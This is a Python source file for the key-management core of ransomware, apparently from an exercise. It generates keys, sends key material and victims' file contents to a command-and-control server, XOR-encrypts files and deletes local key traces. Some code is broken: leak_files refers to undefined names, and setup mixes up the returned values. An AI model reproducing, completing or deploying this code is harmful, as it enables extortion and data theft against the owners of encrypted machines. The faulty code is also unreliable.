from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION
        )
        return kdf.derive(key)

    def create(self) -> Tuple[bytes, bytes, bytes]:
        self._salt = secrets.token_bytes(self.SALT_LENGTH)
        self._key = secrets.token_bytes(self.KEY_LENGTH)
        self._token = secrets.token_bytes(self.TOKEN_LENGTH)

        derived_key = self.do_derivation(self._salt, self._key)
        hashed_salt = sha256(self._salt).digest()
        hashed_token = sha256(self._token).digest()

        return derived_key, hashed_salt, hashed_token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        payload = {
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }
        requests.post(f"http://{self._remote_host_port}/post_new", json=payload)

    def save_to_file(self, filename:str, data:bytes)->None:
        with open(os.path.join(self._path, filename), "wb") as f:
            f.write(data)

    def setup(self)->None:
        self._log.info("Creating secrets")
        token, salt, derived_key = self.create()

        self._log.info("Saving secrets to file")
        if not os.path.exists(self._path):
            os.makedirs(self._path)
        self.save_to_file("token.bin", token)
        self.save_to_file("salt.bin", salt)

        self._log.info("Posting secrets to CNC")
        self.post_new(salt, derived_key, token)


    def load(self) -> None:
        with open(os.path.join(self._path, "salt.bin"), "rb") as f:
            self._salt = f.read()
        with open(os.path.join(self._path, "token.bin"), "rb") as f:
            self._token = f.read()

    def check_key(self, candidate_key:bytes)->bool:
        derived_candidate_key = self.do_derivation(self._salt, candidate_key)
        return self._key == derived_candidate_key

    def set_key(self, b64_key:str)->None:
        candidate_key = base64.b64decode(b64_key)
        if self.check_key(candidate_key):
            self._key = candidate_key
            self._log.info("Key successfully set")
        else:
            raise ValueError("Invalid key provided")

    def get_hex_token(self) -> str:
        if self._token is None:
            raise ValueError("Token has not been generated yet")
        token_hash = sha256(self._token).hexdigest()
        return token_hash

    def xorfiles(self, files: List[str]) -> None:
        for file in files:
            try:
                xorfile(file, self._key)
                self._log.info(f"File {file} encrypted successfully")
            except Exception as e:
                self._log.error(f"Error while encrypting {file}: {e}")

    def leak_files(self, files: List[str]) -> None:
        # POST files to CNC
        params = {'token': self.token}
        body = {'files': []}

        for file in files:
            with open(file, 'rb') as f:
                content = f.read().hex()

            body['files'].append({
                'filename': file,
                'content': content
            })

        try:
            self.post_file(CNC_ADDRESS, params=params, body=body)
            print(f"Files leaked to CNC at {CNC_ADDRESS}")
        except:
            print("Failed to leak files to CNC")

    def clean(self):
        try:
            os.remove(os.path.join(self._path, 'salt.bin'))
            os.remove(os.path.join(self._path, 'token.bin'))
            self._log.info('Cryptographic data cleaned')
        except Exception as e:
            self._log.error(f'Error while cleaning cryptographic data: {e}')